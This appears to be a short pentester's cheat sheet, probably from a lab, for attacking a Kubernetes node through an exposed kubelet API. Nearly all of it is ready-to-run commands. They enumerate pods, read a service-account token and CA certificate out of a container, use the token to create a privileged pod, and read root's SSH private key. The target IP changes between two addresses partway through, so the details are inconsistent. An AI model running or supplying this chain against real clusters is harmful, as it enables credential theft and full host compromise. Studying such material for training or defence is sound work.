- [ ] Interaction with Pods
- [ ] Privilege Escalation

Interaction with Pods!!!
```sh
curl https://10.129.10.11:6443 -k
curl https://10.129.10.11:10250/pods -k | jq .
kubeletctl -i --server 10.129.10.11 pods
```
Privilege Escalation!!!
```sh
# extracting token
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
# extracting certificate
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
# abuse the token
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
# create a new pod
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
# Extract SSH keys
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```